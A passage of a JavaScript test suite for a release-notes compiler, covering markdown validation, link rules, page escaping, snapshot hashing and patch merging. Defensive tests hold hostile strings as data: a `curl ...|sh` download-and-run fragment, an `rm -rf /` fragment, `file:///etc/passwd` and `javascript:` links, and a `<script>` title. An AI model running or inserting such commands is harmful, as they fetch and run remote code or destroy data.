/*---------------------------------------------------------------------------------------------
 *  Tests for the release-notes compiler (compile.mjs, markdown.mjs, page.mjs) — every case
 *  runs against a throwaway tree, never the repo's own docs/release-notes/.
 *  Run with `node --test`.
 *--------------------------------------------------------------------------------------------*/

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { mkTempDir } from '../../lib/temp-root.mjs'
import {
  assertExpectedVersion,
  buildGithubBody,
  checkCanonical,
  collectArchiveFiles,
  collectNoteFiles,
  collectSourceFiles,
  compileAll,
  compileNotes,
  legacyOutcome,
  loadNotes,
  materializeBundle,
  sha256,
  verifySnapshot,
  writeSnapshot,
} from '../release-notes/compile.mjs'
import {
  assertSupportedSubset,
  markdownIt,
  parseBody,
  parseNoteBody,
  prepareTokens,
  renderMarkdown,
} from '../release-notes/markdown.mjs'
import { renderIndexPage, renderNotePage } from '../release-notes/page.mjs'
import {
  LINK_POLICY,
  legacySectionMarker,
  parseNote,
  parsePatchNote,
} from '../release-notes/source.mjs'

const DOC_ID = 'getting-started/interface-tour'
const PATCH_DOC_ID = 'getting-started/patch-notes'

function noteText(
  { version = '0.15.0', date = '2026-10-01', ...fields } = {},
  body = '## 本次重点\n\n- 一条\n',
) {
  const lines = ['---']
  if (version !== null) lines.push(`version: ${version}`)
  if (date !== null) lines.push(`date: ${date}`)
  for (const [key, value] of Object.entries(fields)) {
    if (value !== null && value !== undefined) lines.push(`${key}: ${value}`)
  }
  lines.push('---', '')
  return `${lines.join('\n')}\n${body}`
}

const reviewedNote = (overrides = {}, body) =>
  noteText(
    {
      title: '好用的版本',
      summary: '一句话摘要。',
      status: 'reviewed',
      sourceFrom: 'v0.14.9',
      sourceTo: 'a'.repeat(40),
      ...overrides,
    },
    body,
  )

/** Throwaway repo root + notes dir, with one bundled user doc. */
function makeTree(t) {
  const root = mkTempDir('ue-release-notes-')
  t.after(() => rmSync(root, { recursive: true, force: true }))
  const notesDir = join(root, 'notes')
  mkdirSync(join(root, 'docs/user/zh-CN/getting-started'), { recursive: true })
  writeFileSync(join(root, `docs/user/zh-CN/${DOC_ID}.md`), '# 界面导览\n', 'utf8')
  mkdirSync(notesDir, { recursive: true })
  return { root, notesDir }
}

function writeNote(dir, version, text) {
  writeFileSync(join(dir, `${version}.md`), text, 'utf8')
}

/** Lightweight patch source, matching docs/release-notes/patches/<version>.md. */
function patchText(fields = {}, body = '## 问题修复\n\n- 修好了崩溃\n') {
  const {
    version = '0.15.3',
    notesVersion = '0.15.1',
    date = '2026-10-12',
    status = 'reviewed',
    sourceFrom = 'v0.15.2',
    sourceTo = 'b'.repeat(40),
    urgency,
  } = fields
  const lines = ['---']
  if (version !== null) lines.push(`version: ${version}`)
  if (notesVersion !== null) lines.push(`notesVersion: ${notesVersion}`)
  if (date !== null) lines.push(`date: ${date}`)
  if (status !== null) lines.push(`status: ${status}`)
  if (sourceFrom !== null) lines.push(`sourceFrom: ${sourceFrom}`)
  if (sourceTo !== null) lines.push(`sourceTo: ${sourceTo}`)
  if (urgency !== undefined && urgency !== null) lines.push(`urgency: ${urgency}`)
  lines.push('---', '')
  return `${lines.join('\n')}\n${body}`
}

function writePatch(dir, version, text) {
  mkdirSync(join(dir, 'patches'), { recursive: true })
  writeFileSync(join(dir, 'patches', `${version}.md`), text, 'utf8')
}

const legacyNote = (version, body = '## 新功能\n\n- 归档\n') =>
  noteText({ version, date: null, legacy: 'true', status: 'reviewed' }, body)

/** Compose an archive aggregate the way the migration does: marker + note, joined by \n. */
function writeArchive(notesDir, sections) {
  mkdirSync(join(notesDir, 'archive'), { recursive: true })
  const text = sections
    .map(({ version, text }) => `${legacySectionMarker(version)}\n${text}`)
    .join('\n')
  writeFileSync(join(notesDir, 'archive/legacy.md'), text, 'utf8')
}

function loadOne(notesDir, name, text) {
  writeNote(notesDir, name, text)
  return loadNotes(notesDir)
}

test('loadNotes reports every broken note in one run', (t) => {
  const { notesDir } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  writeNote(notesDir, '0.14.0', 'no frontmatter\n')
  writeNote(notesDir, '0.13.0', noteText({ version: '0.13.0', status: 'nope' }))
  assert.throws(
    () => loadNotes(notesDir),
    (error) => {
      assert.match(error.message, /0\.14\.0\.md/)
      assert.match(error.message, /0\.13\.0\.md/)
      assert.match(error.message, /status 必须是/)
      return true
    },
  )
})

test('loadNotes reads root notes and archive sections alike', (t) => {
  const { notesDir } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  writeArchive(notesDir, [{ version: '0.14.0', text: legacyNote('0.14.0') }])
  const notes = loadNotes(notesDir)
  assert.deepEqual(notes.map((note) => note.version).sort(), ['0.14.0', '0.15.0'])
  const archived = notes.find((note) => note.version === '0.14.0')
  assert.equal(archived.file, 'archive/legacy.md')
  assert.equal(archived.label, 'archive/legacy.md（0.14.0 分节）')
  assert.equal(archived.legacy, true)
})

test('archive sections fail one by one and must stay legacy', (t) => {
  const { notesDir } = makeTree(t)
  writeArchive(notesDir, [
    { version: '0.14.0', text: reviewedNote({ version: '0.14.0', sourceFrom: 'v0.13.0' }) },
    { version: '0.13.0', text: 'no frontmatter\n' },
  ])
  assert.throws(
    () => loadNotes(notesDir),
    (error) => {
      assert.match(error.message, /archive\/legacy\.md（0\.14\.0 分节）: 归档只收迁移稿/)
      assert.match(error.message, /archive\/legacy\.md（0\.13\.0 分节）: frontmatter 缺失/)
      return true
    },
  )
})

test('archive files are collected by the byte order of their relative paths', (t) => {
  const { notesDir } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  writeArchive(notesDir, [{ version: '0.14.0', text: legacyNote('0.14.0') }])
  writeFileSync(join(notesDir, 'archive/README.md'), 'x', 'utf8')
  writeFileSync(join(notesDir, 'archive/_notes.md'), 'x', 'utf8')
  assert.deepEqual(
    collectNoteFiles(notesDir).map((file) => file.name),
    ['0.15.0.md'],
  )
  assert.deepEqual(
    collectArchiveFiles(notesDir).map((file) => file.rel),
    ['archive/legacy.md'],
  )
  assert.deepEqual(
    collectSourceFiles(notesDir).map((file) => file.rel),
    ['0.15.0.md', 'archive/legacy.md'],
  )
})

test('compileNotes fails closed when the target version links a missing doc', (t) => {
  const { notesDir, root } = makeTree(t)
  const notes = loadOne(
    notesDir,
    '0.15.0',
    reviewedNote(
      {},
      `## 本次重点\n\n见 [界面导览](doc:${DOC_ID}) 与 [不存在](doc:missing/doc)。\n`,
    ),
  )
  assert.throws(
    () => compileNotes({ notes, maxVersion: '0.15.0', repoRoot: root }),
    /目标版本文档 docs\/user\/zh-CN\/missing\/doc\.md 不存在/,
  )
})

test('an older version with a vanished doc only warns', (t) => {
  const { notesDir, root } = makeTree(t)
  const notes = loadOne(
    notesDir,
    '0.14.0',
    reviewedNote(
      { version: '0.14.0', sourceFrom: 'v0.13.0' },
      '## 本次重点\n\n见 [界面导览](doc:gone/away)。\n',
    ),
  )
  const { warnings, selected } = compileNotes({ notes, maxVersion: '0.15.0', repoRoot: root })
  assert.equal(selected.length, 1)
  assert.equal(warnings.length, 1)
  assert.match(warnings[0], /文档 gone\/away 不在当前安装包内/)
})

test('errors inside an archive section point at absolute file lines', (t) => {
  const { notesDir, root } = makeTree(t)
  writeArchive(notesDir, [
    { version: '0.14.0', text: legacyNote('0.14.0', '## 本次重点\n\n见 [说明](foo.md)。\n') },
  ])
  const notes = loadNotes(notesDir)
  // Body starts at file line 8 (marker + frontmatter), the link sits two lines below it.
  assert.throws(
    () => compileNotes({ notes, maxVersion: '0.14.0', repoRoot: root }),
    /docs\/release-notes\/archive\/legacy\.md（0\.14\.0 分节）:10: 链接不可用/,
  )
})

test('compileNotes ships only reviewed notes at or below the bound, bytes stable', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  writeNote(notesDir, '0.16.0', reviewedNote({ version: '0.16.0', sourceFrom: 'v0.15.0' }))
  writeNote(notesDir, '0.14.0', reviewedNote({ version: '0.14.0', status: 'draft' }))
  writeNote(
    notesDir,
    '0.13.0',
    noteText(
      { version: '0.13.0', date: null, legacy: 'true', status: 'reviewed' },
      '## 新功能\n\n- 归档\n',
    ),
  )
  const notes = loadNotes(notesDir)

  const first = compileNotes({ notes, maxVersion: '0.15.0', repoRoot: root })
  const second = compileNotes({ notes, maxVersion: '0.15.0', repoRoot: root })
  assert.deepEqual(
    first.selected.map((note) => note.version),
    ['0.15.0', '0.13.0'],
  )
  assert.equal(first.runtimeJson, second.runtimeJson)
  assert.deepEqual([...first.siteFiles], [...second.siteFiles])
  assert.deepEqual(
    JSON.parse(first.runtimeJson).map((entry) => entry.version),
    ['0.15.0', '0.13.0'],
  )
  assert.ok(first.siteFiles.has('notes/v0.15.0.html'))
  assert.ok(first.siteFiles.has('notes/index.html'))
  assert.ok(first.siteFiles.has('notes/index.json'))
  const index = JSON.parse(first.siteFiles.get('notes/index.json'))
  assert.deepEqual(
    index.versions.map((entry) => entry.path),
    ['v0.15.0.html', 'v0.13.0.html'],
  )
})

test('urgency reaches the site index but never the in-app runtime JSON', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote({ urgency: 'important' }, '## 问题修复\n\n- 修好了\n'))
  writeNote(notesDir, '0.15.1', reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }))
  const notes = loadNotes(notesDir)

  const { siteFiles, runtimeJson } = compileNotes({ notes, maxVersion: '0.15.1', repoRoot: root })
  const index = JSON.parse(siteFiles.get('notes/index.json'))
  assert.deepEqual(
    index.versions.map((entry) => [entry.version, entry.urgency]),
    [
      ['0.15.1', 'normal'],
      ['0.15.0', 'important'],
    ],
  )
  assert.ok(
    JSON.parse(runtimeJson).every((entry) => !('urgency' in entry)),
    'the in-app runtime JSON must stay free of urgency',
  )
})

test('raw HTML, images, indented code and reference links fail closed', (t) => {
  const { notesDir, root } = makeTree(t)
  const cases = [
    ['<b>粗</b>\n', /不支持的 Markdown 语法（原始 HTML）/],
    ['![图](https://example.com/a.png)\n', /不支持的 Markdown 语法（图片）/],
    ['[文字][ref]\n\n[ref]: https://example.com\n', /不支持引用式链接/],
    ['示例：\n\n    indented code\n', /不支持的 Markdown 语法（缩进式代码块/],
    ['标题\n===\n', /标题不支持下划线式写法/],
  ]
  for (const [body, expected] of cases) {
    const notes = loadOne(notesDir, '0.15.0', reviewedNote({}, `## 小节\n\n${body}`))
    assert.throws(() => compileNotes({ notes, maxVersion: '0.15.0', repoRoot: root }), expected)
  }

  // An H1 is caught while parsing the source (friendly message) and again on the token
  // stream (setext `===` headings never reach the source-level check).
  assert.throws(
    () => loadOne(notesDir, '0.15.0', reviewedNote({}, '## 小节\n\n# 一级标题\n')),
    /正文不要写一级标题/,
  )
  assert.throws(() => parseNoteBody('## 小节\n\n# 一级\n', { label: 'x.md' }), /正文不要写一级标题/)
})

test('forbidden link protocols never render', () => {
  assert.throws(
    () => parseNoteBody('## x\n\n[点我](file:///etc/passwd)\n', { label: 'x.md' }),
    /链接不可用 —— 不允许的链接协议：file:/,
  )
  assert.throws(
    () => parseNoteBody('## x\n\n[点我](javascript:alert\(1\))\n', { label: 'x.md' }),
    /不允许的链接协议：javascript:/,
  )
})

test('bare text is never auto-linked — only an explicit scheme links', () => {
  // linkify's fuzzy mode turns `message.id` / `CLAUDE.md` / `install.sh` into links to real
  // domains, which the app renderer (scheme-only) would never do. Shipping that would put
  // invented, clickable domains on the public download page and in the GitHub body.
  const body =
    '## 本次重点\n\n见 message.id、CLAUDE.md、install.sh、run.py 与 foo.io；官网 https://example.com。\n'
  const { tokens } = parseNoteBody(body, { label: 'x.md' })
  const html = markdownIt.renderer.render(
    prepareTokens(tokens, { version: '0.15.0' }),
    markdownIt.options,
    {},
  )
  assert.ok(html.includes('<a href="https://example.com"'), '显式 scheme 仍应成链')
  assert.ok(!html.includes('<a href="http://'), '不得凭裸文本编造 http 链接')
  for (const word of ['message.id', 'CLAUDE.md', 'install.sh', 'run.py', 'foo.io']) {
    assert.ok(html.includes(word), `${word} 应保留为文字`)
    assert.ok(
      !new RegExp(`<a[^>]*>[^<]*${word.replace('.', '\\.')}`).test(html),
      `${word} 不得成链`,
    )
  }

  const notes = [parseNote(reviewedNote({}, body), { file: '0.15.0.md' })]
  const github = buildGithubBody({ notes, version: '0.15.0' })
  assert.ok(!github.includes('[message.id]'))
  assert.ok(github.includes('[https://example.com](https://example.com)'))

  // Explicitly written schemes stay fail-closed — the dialect change must not relax the audit.
  assert.throws(
    () => parseNoteBody('## x\n\n[邮件](mailto:dev@example.com)\n', { label: 'x.md' }),
    /不允许的链接协议：mailto:/,
  )
})

test('site headings carry the app slug and anchor hrefs stay literal', () => {
  const note = parseNote(
    reviewedNote({}, '## 子结构：ITalkItem\n\n见 [下文](#子结构italkitem)。\n'),
    { file: '0.15.0.md' },
  )
  const { tokens } = parseNoteBody(note.body, { label: '0.15.0.md' })
  const page = renderNotePage({
    note,
    bodyHtml: markdownIt.renderer.render(
      prepareTokens(tokens, { version: note.version }),
      markdownIt.options,
      {},
    ),
  })
  // The app scrolls to data-anchor="<slug>"; the site must publish the same slug as an id,
  // and markdown-it must not percent-encode the fragment away from it.
  assert.ok(page.includes('id="子结构italkitem"'))
  assert.ok(page.includes('href="#子结构italkitem"'))
  assert.ok(!page.includes('%E5%AD%90'))

  const { tokens: bare } = parseNoteBody('## ——\n\n- 一条\n', { label: 'x.md' })
  const emptyPage = renderNotePage({
    note: parseNote(reviewedNote({}, '## ——\n\n- 一条\n'), { file: '0.15.0.md' }),
    bodyHtml: markdownIt.renderer.render(bare, markdownIt.options, {}),
  })
  assert.ok(emptyPage.includes('<h2>'), '空 slug 不挂 id（与应用侧一致）')
})

test('anchors must resolve to a heading in the same note', () => {
  assert.throws(
    () => parseNoteBody('## 有\n\n见 [x](#没有)。\n', { label: 'x.md' }),
    /锚点 #没有 在本稿内没有对应标题/,
  )
  assert.throws(
    () => parseNoteBody('## 重复\n\n## 重复\n\n见 [x](#重复)。\n', { label: 'x.md' }),
    /锚点 #重复 命中多个标题/,
  )
  // Duplicates nobody links to stay legal — history must not go red retroactively.
  assert.doesNotThrow(() => parseNoteBody('## 重复\n\n## 重复\n\n- 一条\n', { label: 'x.md' }))
})

test('the GitHub body is markdown-only, rewritten per target and fully traceable', () => {
  const notes = [
    parseNote(
      reviewedNote(
        {},
        [
          '## 本次重点',
          '',
          `见 [界面导览](doc:${DOC_ID}) 与 [官网](https://example.com/news)。`,
          '',
          `在 [设置](command:workbench.action.openSettings) 里改。`,
          '',
          '```text',
          `doc:${DOC_ID} 与 command:workbench.action.openSettings`,
          '```',
          '',
          '行内 `command:workbench.action.openSettings` 保持不变。',
          '',
          '| 列 | 值 |',
          '| --- | --- |',
          '| a | b |',
          '',
        ].join('\n'),
      ),
      { file: '0.15.0.md' },
    ),
  ]
  const body = buildGithubBody({ notes, version: '0.15.0' })
  assert.ok(!body.includes('---\nversion:'), '不得带 frontmatter')
  assert.ok(
    body.startsWith('# Universe Editor v0.15.0 · 2026-10-01\n\n**好用的版本**\n\n一句话摘要。\n'),
  )
  assert.ok(
    body.includes(`${LINK_POLICY.publicRepoBase}/blob/v0.15.0/docs/user/zh-CN/${DOC_ID}.md`),
  )
  assert.ok(body.includes('[官网](https://example.com/news)'))
  assert.ok(body.includes('在 在编辑器中：设置 里改。'))
  assert.ok(!body.includes('command:workbench.action.openSettings)'))
  assert.ok(
    body.includes('doc:getting-started/interface-tour 与 command:workbench.action.openSettings'),
  )
  assert.ok(body.includes('行内 `command:workbench.action.openSettings` 保持不变。'))
  assert.ok(body.includes('| 列 | 值 |\n| --- | --- |\n| a | b |'))
  assert.ok(body.includes('供 samples 仓库 e2e 下载'))
  assert.ok(body.endsWith('\n'))
})

test('text that looks like a shell fragment stays inert markdown', () => {
  const notes = [
    parseNote(
      reviewedNote(
        {},
        '## 升级注意事项\n\n命令里的 `$(curl tracker.example.com|sh)` 与 `"$(rm -rf /)"` 都只作说明。\n',
      ),
      { file: '0.15.0.md' },
    ),
  ]
  const body = buildGithubBody({ notes, version: '0.15.0' })
  assert.ok(body.includes('`$(curl tracker.example.com|sh)`'))
  assert.ok(body.includes('`"$(rm -rf /)"`'))
  const lines = body.split('\n')
  assert.ok(lines.every((line) => !line.includes('$(curl') || line.includes('`')))
})

test('markdown serialization escapes control characters in plain text', () => {
  const { tokens } = parseBody('## x\n\n不加粗 与 a_b_[c] 与 *加粗*\n')
  const text = renderMarkdown(tokens)
  assert.equal(text, '## x\n\n不加粗 与 a\\_b\\_\\[c\\] 与 *加粗*\n')
})

test('prepareTokens rewrites doc links for the site and leaves prose links alone', () => {
  const { tokens } = parseNoteBody('## x\n\n[界面导览](doc:getting-started/interface-tour)\n', {
    label: 'x.md',
  })
  prepareTokens(tokens, { version: '0.15.0' })
  const html = markdownIt.renderer.render(tokens, markdownIt.options, {})
  assert.ok(
    html.includes(
      `href="${LINK_POLICY.publicRepoBase}/blob/v0.15.0/docs/user/zh-CN/getting-started/interface-tour.md"`,
    ),
  )
  assert.ok(html.includes('target="_blank"'))
  assert.ok(html.includes('rel="noopener noreferrer"'))
})

test('the site page is self-contained, escaped and newest-first on the index', () => {
  const note = parseNote(
    reviewedNote({ title: '<script>alert(1)</script>' }, '## 本次重点\n\n- 一条\n'),
    { file: '0.15.0.md' },
  )
  const { tokens } = parseNoteBody(note.body, { label: '0.15.0.md' })
  const page = renderNotePage({
    note,
    bodyHtml: markdownIt.renderer.render(
      prepareTokens(tokens, { version: note.version }),
      markdownIt.options,
      {},
    ),
  })
  assert.ok(!page.includes('<script'))
  assert.ok(page.includes('&lt;script&gt;alert(1)&lt;/script&gt;'))
  assert.ok(page.includes('<title>Universe Editor v0.15.0 · 2026-10-01 — &lt;script&gt;'))
  assert.ok(page.includes('href="../index.html"'))
  assert.ok(page.includes('href="./index.html"'))
  assert.ok(!page.includes('<link '))
  assert.ok(!page.includes('src='))

  const empty = renderNotePage({ note, bodyHtml: '' })
  assert.ok(empty.includes('此版本没有记录用户可见的变更。'))

  const index = renderIndexPage({
    notes: [
      parseNote(reviewedNote(), { file: '0.15.0.md' }),
      parseNote(
        reviewedNote(
          {
            version: '0.13.0',
            date: null,
            legacy: 'true',
            status: 'reviewed',
            title: null,
            summary: null,
          },
          '## 新功能\n',
        ),
        { file: '0.13.0.md' },
      ),
    ],
  })
  const order = [index.indexOf('v0.15.0.html'), index.indexOf('v0.13.0.html')]
  assert.ok(order[0] > 0 && order[1] > order[0], '新版本在前')
  assert.ok(index.includes('<span class="v">Universe Editor v0.13.0</span>'))
})

test('compileAll produces a manifest with per-artifact hashes and source digests', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  const compiled = compileAll({ maxVersion: '0.15.0', notesDir, repoRoot: root })
  const manifest = compiled.manifest
  assert.equal(manifest.schema, 2)
  assert.equal(manifest.version, '0.15.0')
  assert.equal(manifest.repo, LINK_POLICY.publicRepoBase)
  assert.deepEqual(manifest.source.dir, 'docs/release-notes')
  assert.deepEqual(
    manifest.source.files.map((entry) => entry.file),
    ['0.15.0.md'],
  )
  assert.equal(manifest.source.files[0].sha256, sha256(reviewedNote()))
  assert.equal(manifest.source.files[0].kind, 'note')
  assert.deepEqual(manifest.source.files[0].versions, ['0.15.0'])

  const runtime = manifest.artifacts.find((artifact) => artifact.path === 'release-notes.json')
  assert.deepEqual(
    { kind: runtime.kind, upload: runtime.upload, mode: runtime.mode },
    { kind: 'runtime', upload: true, mode: 'atomic' },
  )
  assert.equal(runtime.sha256, sha256(compiled.runtimeJson))
  const page = manifest.artifacts.find((artifact) => artifact.path === 'notes/v0.15.0.html')
  assert.equal(page.mode, 'direct')
  const github = manifest.artifacts.find((artifact) => artifact.kind === 'github')
  assert.equal(github.upload, false)
  assert.equal(github.path, 'github-release-0.15.0.md')
  assert.equal(compiled.files.get('manifest.json'), `${JSON.stringify(manifest, null, 2)}\n`)

  // Site pages never leak the source frontmatter or the runtime title key names.
  const pageHtml = compiled.files.get('notes/v0.15.0.html')
  assert.ok(!pageHtml.includes('sourceFrom'))
  assert.ok(pageHtml.includes('一句话摘要。'))
})

test('an archive compiles like any source and the manifest records it as one file', (t) => {
  const { notesDir, root } = makeTree(t)
  writeArchive(notesDir, [
    { version: '0.14.0', text: legacyNote('0.14.0') },
    { version: '0.13.0', text: legacyNote('0.13.0', '') },
  ])
  const compiled = compileAll({ maxVersion: '0.14.0', notesDir, repoRoot: root })
  assert.deepEqual(
    compiled.selected.map((note) => note.version),
    ['0.14.0', '0.13.0'],
  )
  const physical = readFileSync(join(notesDir, 'archive/legacy.md'), 'utf8')
  assert.deepEqual(compiled.manifest.source.files, [
    {
      file: 'archive/legacy.md',
      kind: 'archive',
      bytes: Buffer.byteLength(physical, 'utf8'),
      sha256: sha256(physical),
      versions: ['0.14.0', '0.13.0'],
    },
  ])
  // One physical file: the digest covers the section markers too, not just the notes.
  assert.notEqual(compiled.manifest.source.files[0].sha256, sha256(legacyNote('0.14.0')))
})

test('snapshot + bundle round trip, stale files removed and manifest carried over', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  const compiled = compileAll({ maxVersion: '0.15.0', notesDir, repoRoot: root })
  const snapshotDir = join(root, '.snapshot')
  const bundleDir = join(root, 'bundle')
  writeSnapshot({ snapshotDir, compiled })
  mkdirSync(bundleDir, { recursive: true })
  writeFileSync(join(bundleDir, 'stale.html'), 'old', 'utf8')

  const manifest = materializeBundle({ bundleDir, snapshotDir, notesDir })
  assert.equal(manifest.version, '0.15.0')
  assert.ok(!existsSync(join(bundleDir, 'stale.html')), '旧发布包残留必须清理')
  for (const artifact of manifest.artifacts) {
    const content = readFileSync(join(bundleDir, ...artifact.path.split('/')))
    assert.equal(sha256(content), artifact.sha256)
  }
  assert.equal(
    readFileSync(join(bundleDir, 'manifest.json'), 'utf8'),
    readFileSync(join(snapshotDir, 'manifest.json'), 'utf8'),
  )
  assert.deepEqual(readdirSync(join(bundleDir, 'notes')).sort(), [
    'index.html',
    'index.json',
    'v0.15.0.html',
  ])
})

test('the snapshot is verified before it is published', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  const compiled = compileAll({ maxVersion: '0.15.0', notesDir, repoRoot: root })
  const snapshotDir = join(root, '.snapshot')
  writeSnapshot({ snapshotDir, compiled })
  const manifest = verifySnapshot(snapshotDir)

  writeFileSync(join(snapshotDir, 'release-notes.json'), '[]', 'utf8')
  assert.throws(
    () => materializeBundle({ bundleDir: join(root, 'bundle'), snapshotDir, notesDir }),
    /快照产物 release-notes\.json 与 manifest 哈希不符|字节数与 manifest 不符/,
  )

  writeFileSync(join(snapshotDir, 'release-notes.json'), compiled.runtimeJson, 'utf8')
  rmSync(join(snapshotDir, 'notes/index.html'))
  assert.throws(() => verifySnapshot(snapshotDir, manifest), /快照缺少产物 notes\/index\.html/)
  assert.throws(
    () =>
      materializeBundle({
        bundleDir: join(root, 'bundle'),
        snapshotDir: join(root, 'nope'),
        notesDir,
      }),
    /缺少编译快照/,
  )
})

test('editing a source after packaging blocks the upload bundle', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  const compiled = compileAll({ maxVersion: '0.15.0', notesDir, repoRoot: root })
  const snapshotDir = join(root, '.snapshot')
  const bundleDir = join(root, 'bundle')
  writeSnapshot({ snapshotDir, compiled })

  writeNote(notesDir, '0.15.0', reviewedNote({}, '## 本次重点\n\n- 改过\n'))
  assert.throws(
    () => materializeBundle({ bundleDir, snapshotDir, notesDir }),
    /源文件在打包后发生变化（0\.15\.0\.md）/,
  )
  assert.ok(!existsSync(bundleDir), '拒绝时不产生发布包')

  writeNote(notesDir, '0.15.0', reviewedNote())
  writeNote(notesDir, '0.14.0', reviewedNote({ version: '0.14.0', status: 'draft' }))
  assert.throws(
    () => materializeBundle({ bundleDir, snapshotDir, notesDir }),
    /源文件在打包后发生变化（文件数量变化）/,
  )
})

test('editing an archive after packaging blocks the upload bundle', (t) => {
  const { notesDir, root } = makeTree(t)
  writeArchive(notesDir, [{ version: '0.14.0', text: legacyNote('0.14.0') }])
  const compiled = compileAll({ maxVersion: '0.14.0', notesDir, repoRoot: root })
  const snapshotDir = join(root, '.snapshot')
  const bundleDir = join(root, 'bundle')
  writeSnapshot({ snapshotDir, compiled })

  writeArchive(notesDir, [
    { version: '0.14.0', text: legacyNote('0.14.0', '## 新功能\n\n- 改过\n') },
  ])
  assert.throws(
    () => materializeBundle({ bundleDir, snapshotDir, notesDir }),
    /源文件在打包后发生变化（archive\/legacy\.md）/,
  )
  assert.ok(!existsSync(bundleDir), '拒绝时不产生发布包')

  writeArchive(notesDir, [{ version: '0.14.0', text: legacyNote('0.14.0') }])
  writeFileSync(
    join(notesDir, 'archive/extra.md'),
    `${legacySectionMarker('0.13.0')}\n${legacyNote('0.13.0')}`,
    'utf8',
  )
  assert.throws(
    () => materializeBundle({ bundleDir, snapshotDir, notesDir }),
    /源文件在打包后发生变化（文件数量变化）/,
  )
})

test('--check reports drift with both hashes and refuses a missing canonical file', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(notesDir, '0.15.0', reviewedNote())
  const compiled = compileAll({ maxVersion: '0.15.0', notesDir, repoRoot: root })
  const canonicalPath = join(root, 'release-notes.json')

  assert.throws(
    () => checkCanonical({ compiled, canonicalPath }),
    /缺少 .*release-notes\.json；先运行 pnpm release:notes/,
  )
  writeFileSync(canonicalPath, compiled.runtimeJson, 'utf8')
  assert.doesNotThrow(() => checkCanonical({ compiled, canonicalPath }))

  writeFileSync(canonicalPath, `${compiled.runtimeJson.trim()}\n\n`, 'utf8')
  assert.throws(
    () => checkCanonical({ compiled, canonicalPath }),
    (error) => {
      assert.match(error.message, /派生物漂移/)
      assert.ok(error.message.includes(sha256(readFileSync(canonicalPath, 'utf8'))))
      assert.ok(error.message.includes(sha256(compiled.runtimeJson)))
      return true
    },
  )
})

test('--expect-version guards the packaged app version', (t) => {
  const { root } = makeTree(t)
  const packageJsonPath = join(root, 'package.json')
  writeFileSync(packageJsonPath, JSON.stringify({ name: 'x', version: '0.15.0' }), 'utf8')
  assert.doesNotThrow(() => assertExpectedVersion('0.15.0', packageJsonPath))
  assert.throws(
    () => assertExpectedVersion('0.16.0', packageJsonPath),
    /apps\/editor\/package\.json 版本是 0\.15\.0，期望 0\.16\.0/,
  )
})

test('a tree without sources skips --bundle but still refuses to fake a GitHub body', () => {
  // --bundle runs last in the packaging chain: failing there throws away a full
  // stage/build/electron-builder run, so a source-less tree must degrade instead.
  assert.equal(legacyOutcome({ bundle: 'apps/editor/release/release-notes' }, false), 'skip')
  assert.equal(legacyOutcome({}, false), 'skip')
  assert.equal(legacyOutcome({ bundle: 'x', expectVersion: '0.14.9' }, false), 'skip')
  assert.equal(legacyOutcome({ githubBody: '0.14.9' }, false), 'github-body-error')
  assert.equal(legacyOutcome({ bundle: 'x' }, true), 'compile')
  assert.equal(legacyOutcome({}, true), 'compile')
})

test('collectNoteFiles orders by bytes, not by the host locale', (t) => {
  const dir = mkTempDir('ue-release-notes-order-')
  t.after(() => rmSync(dir, { recursive: true, force: true }))
  // `B.md`/`a.md` disagree under both orders while staying distinct names on a
  // case-insensitive filesystem — `A.md`/`a.md` would collapse into one file there.
  for (const name of ['a.md', 'B.md', 'README.md', '_template.md']) {
    writeFileSync(join(dir, name), '')
  }
  // ICU collation puts `a.md` first, bytes put `B.md` first; these names reach manifest.json verbatim.
  assert.deepEqual(
    collectNoteFiles(dir).map((file) => file.name),
    ['B.md', 'a.md'],
  )
})

test('the subset validator and the serializer agree on the token vocabulary', () => {
  assert.throws(
    () => parseNoteBody('<b>x</b>\n', { label: 'x.md' }),
    /不支持的 Markdown 语法（原始 HTML）/,
  )
  assert.throws(
    () => parseNoteBody('<!-- 注释 -->\n', { label: 'x.md' }),
    /不支持的 Markdown 语法（原始 HTML）/,
  )
  const unknown = [{ type: 'mystery', tag: 'x', map: [0, 1] }]
  assert.throws(() => assertSupportedSubset(unknown, {}, { label: 'x.md' }), /mystery <x>/)
  assert.throws(() => renderMarkdown(unknown), /未覆盖的语法：mystery <x>/)
})

// ------------------------------------------------------------------ patch merging

test('patches merge into their main note without a separate page or runtime entry', (t) => {
  const { notesDir, root } = makeTree(t)
  writeNote(
    notesDir,
    '0.15.1',
    reviewedNote({ version: '0.15.1', sourceFrom: 'v0.15.0' }, '## 本次重点\n\n- 主稿内容\n'),
  )
  writePatch(notesDir, '0.15.3', patchText({ notesVersion: '0.15.1' }))

  const compiled = compileAll({ maxVersion: '0.15.3', notesDir, repoRoot: root })
  const runtime = JSON.parse(compiled.runtimeJson)
  assert.deepEqual(
    runtime.map((entry) => entry.version),
    ['0.15.1'],
  )
  assert.match(runtime[0].body, /- 主稿内容/)
  assert.match(runtime[0].body, /## v0\.15\.3 补丁修复/)
  assert.match(runtime[0].body, /- 修好了崩溃/)
  assert.ok(!runtime.some((entry) => entry.version === '0.15.3'))

  assert.ok(compiled.files.has('notes/v0.15.1.html'))
  assert.ok(!compiled.files.has('notes/v0.15.3.html'), '不生成独立补丁页')
  const page = compiled.files.get('notes/v0.15.1.html')
  assert.match(page, /v0\.15\.3 补丁修复/)
  assert.match(page, /修好了崩溃/)

  const index = JSON.parse(compiled.files.get('notes/index.json'))
  assert.deepEqual(
    index.versions.map((entry) => [entry.version, entry.notesVersion, entry.path]),
    [
      ['0.15.3', '0.15.1', 'v0.15.1.html'],
